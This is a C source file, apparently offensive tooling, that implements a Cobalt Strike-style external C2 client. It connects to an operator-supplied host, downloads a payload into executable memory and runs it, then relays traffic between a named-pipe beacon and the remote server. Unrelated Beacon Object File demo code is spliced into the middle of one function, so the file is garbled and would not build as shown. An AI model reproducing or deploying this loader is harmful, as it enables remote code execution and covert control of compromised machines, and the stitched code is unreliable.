/*
Name : Jicop-H00k
Author : S3N4T0R
Date : January 23rd 2022 - January 26th 2022
Language : C++

/*
 * Build:
 * i686-w64-mingw32-gcc JicopH00k.c -o JicopH00k.o -lws2_32
 */

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <dsgetdc.h>
#include <mapi.h>
#pragma argused
#pragma inline
#pragma pack(push,4)
#ifndef HPSS
#define HPSS HANDLE
#endif
#pragma pack(push,4)
#define MiniDumpWithFullMemory 0x00000002
#define PAYLOAD_MAX_SIZE 512 * 1024
#define BUFFER_MAX_SIZE 1024 * 1024


/* data API */
typedef struct {
	char * original;
	char * buffer;   
	int    length;   
	int    size;   
} datap;

DECLSPEC_IMPORT void    BeaconDataParse(datap * parser, char * buffer, int size);
DECLSPEC_IMPORT char *  BeaconDataPtr(datap * parser, int size);
DECLSPEC_IMPORT int     BeaconDataInt(datap * parser);
DECLSPEC_IMPORT short   BeaconDataShort(datap * parser);
DECLSPEC_IMPORT int     BeaconDataLength(datap * parser);
DECLSPEC_IMPORT char *  BeaconDataExtract(datap * parser, int * size);

/* format API */
typedef struct {
	char * original;
	char * buffer;  
	int    length;   
	int    size;     
} formatp;

DECLSPEC_IMPORT void    BeaconFormatAlloc(formatp * format, int maxsz);
DECLSPEC_IMPORT void    BeaconFormatReset(formatp * format);
DECLSPEC_IMPORT void    BeaconFormatAppend(formatp * format, char * text, int len);
DECLSPEC_IMPORT void    BeaconFormatPrintf(formatp * format, char * fmt, ...);
DECLSPEC_IMPORT char *  BeaconFormatToString(formatp * format, int * size);
DECLSPEC_IMPORT void    BeaconFormatFree(formatp * format);
DECLSPEC_IMPORT void    BeaconFormatInt(formatp * format, int value);

/* Output Functions */
#define CALLBACK_OUTPUT      0x0
#define CALLBACK_OUTPUT_OEM  0x1e
#define CALLBACK_OUTPUT_UTF8 0x20
#define CALLBACK_ERROR       0x0d

DECLSPEC_IMPORT void   BeaconOutput(int type, char * data, int len);
DECLSPEC_IMPORT void   BeaconPrintf(int type, char * fmt, ...);


/* Token Functions */
DECLSPEC_IMPORT BOOL   BeaconUseToken(HANDLE token);
DECLSPEC_IMPORT void   BeaconRevertToken();
DECLSPEC_IMPORT BOOL   BeaconIsAdmin();

/* Spawn+Inject Functions */
DECLSPEC_IMPORT void   BeaconGetSpawnTo(BOOL x86, char * buffer, int length);
DECLSPEC_IMPORT void   BeaconInjectProcess(HANDLE hProc, int pid, char * payload, int p_len, int p_offset, char * arg, int a_len);
DECLSPEC_IMPORT void   BeaconInjectTemporaryProcess(PROCESS_INFORMATION * pInfo, char * payload, int p_len, int p_offset, char * arg, int a_len);
DECLSPEC_IMPORT BOOL   BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMATION * pInfo);
DECLSPEC_IMPORT void   BeaconCleanupProcess(PROCESS_INFORMATION * pInfo);

/* Utility Functions */
DECLSPEC_IMPORT BOOL   toWideChar(char * src, wchar_t * dst, int max);

/* read a frame from a handle */
DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max) {
	DWORD size = 0, temp = 0, total = 0;

	/* read the 4-byte length */
	ReadFile(my_handle, (char *)&size, 4, &temp, NULL);

	/* read the whole thing in */
	while (total < size) {
		ReadFile(my_handle, buffer + total, size - total, &temp, NULL);
		total += temp;
	}

	return size;
}

/* receive a frame from a socket */
DWORD recv_frame(SOCKET my_socket, char * buffer, DWORD max) {
	DWORD size = 0, total = 0, temp = 0;

	/* read the 4-byte length */
	recv(my_socket, (char *)&size, 4, 0);

	/* read in the result */
	while (total < size) {
		temp = recv(my_socket, buffer + total, size - total, 0);
		total += temp;
	}

	return size;
}

/* send a frame via a socket */
void send_frame(SOCKET my_socket, char * buffer, int length) {
	send(my_socket, (char *)&length, 4, 0);
	send(my_socket, buffer, length, 0);
}

typedef enum {
    PSS_CAPTURE_NONE = 0x00000000,
    PSS_CAPTURE_VA_CLONE = 0x00000001,
    PSS_CAPTURE_RESERVED_00000002 = 0x00000002,
    PSS_CAPTURE_HANDLES = 0x00000004,
    PSS_CAPTURE_HANDLE_NAME_INFORMATION = 0x00000008,
    PSS_CAPTURE_HANDLE_BASIC_INFORMATION = 0x00000010,
    PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION = 0x00000020,
    PSS_CAPTURE_HANDLE_TRACE = 0x00000040,
    PSS_CAPTURE_THREADS = 0x00000080,
    PSS_CAPTURE_THREAD_CONTEXT = 0x00000100,
    PSS_CAPTURE_THREAD_CONTEXT_EXTENDED = 0x00000200,
    PSS_CAPTURE_RESERVED_00000400 = 0x00000400,
    PSS_CAPTURE_VA_SPACE = 0x00000800,
    PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION = 0x00001000,
    PSS_CAPTURE_IPT_TRACE = 0x00002000,
    PSS_CREATE_BREAKAWAY_OPTIONAL = 0x04000000,
    PSS_CREATE_BREAKAWAY = 0x08000000,
    PSS_CREATE_FORCE_BREAKAWAY = 0x10000000,
    PSS_CREATE_USE_VM_ALLOCATIONS = 0x20000000,
    PSS_CREATE_MEASURE_PERFORMANCE = 0x40000000,
    PSS_CREATE_RELEASE_SECTION = 0x80000000
} PSS_CAPTURE_FLAGS;



void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
	DWORD wrote = 0;
	WriteFile(my_handle, (void *)&length, 4, &wrote, NULL);
	WriteFile(my_handle, buffer, length, &wrote, NULL);
}


void go(char * host, DWORD port) {





	struct sockaddr_in 	sock;
	sock.sin_family = AF_INET;
	sock.sin_addr.s_addr = inet_addr(host);
	sock.sin_port = htons(port);


	SOCKET socket_extc2 = socket(AF_INET, SOCK_STREAM, 0);
	if ( connect(socket_extc2, (struct sockaddr *)&sock, sizeof(sock)) ) {
		printf("Could not connect to %s:%d\n", host, port);
		exit(0);
	}

	

	send_frame(socket_extc2, "arch=x86", 8);
	send_frame(socket_extc2, "pipename=foobar", 15);
	send_frame(socket_extc2, "block=100", 9);

	

unsigned char badger_bin[] = {
};


unsigned int badger_bin_len = 0;


WINBASEAPI int WINAPI KERNEL32$lstrlenA (LPCSTR lpString);


int    gCount = 5;
int    gxCount = 0;
char * gBuffer = "abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwx";
char * gStrList[] = {"gggg", "5555", "ssss", "zzzz"};
int    gStrListSize = sizeof(gStrList) / sizeof(char *);



int somefunc(char *src, char *dest, int destLen, int offset) {
   int i;
   for(i = 0; i < destLen && src[i] != 0x0; i++) {
      dest[i] = src[i] + offset;
   }
   ++gCount;
   return i;
}


void printStrList(formatp *buffer, char *name, char **list, int count) {
   BeaconFormatPrintf(buffer, "listName: %s length: %d\n", name, count);
   for (int i = 0; i < count; i++) {
      BeaconFormatPrintf(buffer, "%s[%d] %s\n", name, i, list[i]);
   }
   gxCount++;
}


void go(char * args, int alen) { 
   datap  parser;
   formatp buffer;
   char * str_arg;
   int    num_arg;
   int    result;
   char   stuff1[40] = "AAAAAAAABBBBBBBBCCCCCCCC";
   char   stuff2[20] = { 'Z', 'Z', 'Z', 'Z', 'Z', 'Y', 'Y', 'Y', 'Y', 'Y', 'X', 'X', 'X', 'X', 'X', 'W', 'W', 'W', 'W', 0x0 };
   char * lStrList[] = {"123", "456", "789", "abc"};
   int    lStrListSize = sizeof(lStrList) / sizeof(char *);
   

   BeaconDataParse(&parser, args, alen);
   str_arg = BeaconDataExtract(&parser, NULL);
   num_arg = BeaconDataInt(&parser);


   BeaconFormatAlloc(&buffer, 1024);

   BeaconFormatPrintf(&buffer, "gCount: %d gxGount: %d\n", gCount, gxCount);

   BeaconFormatPrintf(&buffer, "Args[0]: %s Args[1]: %d\n", str_arg, num_arg);

   ++gCount;
   ++gxCount;
   BeaconFormatPrintf(&buffer, "[stuff1 before] %d %s\n", sizeof(stuff1), stuff1);
   result = somefunc(str_arg, stuff1, sizeof(stuff1), 1);
   BeaconFormatPrintf(&buffer, "[stuff1 after ] %d %s\n", result, stuff1);
   BeaconFormatPrintf(&buffer, "gCount: %d gxGount: %d\n", gCount, gxCount);

   BeaconFormatPrintf(&buffer, "[stuff2 before] %d %s\n", sizeof(stuff2), stuff2);
   result = somefunc(stuff2, stuff2, sizeof(stuff2), 1);
   BeaconFormatPrintf(&buffer, "[stuff2 after ] %d %s\n", result, stuff2);

   printStrList(&buffer, "lStrList", lStrList, lStrListSize);
   printStrList(&buffer, "gStrList", gStrList, gStrListSize);

   ++gCount;
   BeaconFormatPrintf(&buffer, "[gBuffer before] %d %s\n", KERNEL32$lstrlenA(gBuffer), gBuffer);
   result = somefunc(stuff1, gBuffer, KERNEL32$lstrlenA(gBuffer), -1);
   BeaconFormatPrintf(&buffer, "[gBuffer after ] %d %s\n", result, gBuffer);
   BeaconFormatPrintf(&buffer, "gCount: %d gxGount: %d\n", gCount, gxCount);



   BeaconPrintf(CALLBACK_OUTPUT, "%s\n", BeaconFormatToString(&buffer, NULL));

} 

void demo(char * args, int length) {
   datap  parser;
   char * str_arg;
   int    num_arg;
   
   BeaconDataParse(&parser, args, length);
   str_arg = BeaconDataExtract(&parser, NULL);
   num_arg = BeaconDataInt(&parser);
   
   BeaconPrintf(CALLBACK_OUTPUT, "Message is %s with %d arg", str_arg, num_arg);
}


	send_frame(socket_extc2, "go", 2);


	char * payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	recv_frame(socket_extc2, payload, PAYLOAD_MAX_SIZE);


	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);

	
	HANDLE handle_beacon = INVALID_HANDLE_VALUE;
	while (handle_beacon == INVALID_HANDLE_VALUE) {
		Sleep(1000);
		handle_beacon = CreateFileA("\\\\.\\pipe\\foobar", GENERIC_READ | GENERIC_WRITE,
			0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
	}


	char * buffer = (char *)malloc(BUFFER_MAX_SIZE); /* 1MB should do */

	
	while (TRUE) {

		DWORD read = read_frame(handle_beacon, buffer, BUFFER_MAX_SIZE);
		if (read < 0) {
			break;
		}


		send_frame(socket_extc2, buffer, read);


		read = recv_frame(socket_extc2, buffer, BUFFER_MAX_SIZE);
		if (read < 0) {
			break;
		}


		write_frame(handle_beacon, buffer, read);
	}


	CloseHandle(handle_beacon);
	closesocket(socket_extc2);
}

void main(DWORD argc, char * argv[]) {

	if (argc != 3) {
		printf("%smessage from jicop hook developer [S3N4T0R] set the facking host and port after the executioble\n", argv[0]);
		exit(1);
	}


	WSADATA wsaData;
	WORD    wVersionRequested;
	wVersionRequested = MAKEWORD(2, 2);
	WSAStartup(wVersionRequested, &wsaData);


	go(argv[1], atoi(argv[2]));
}

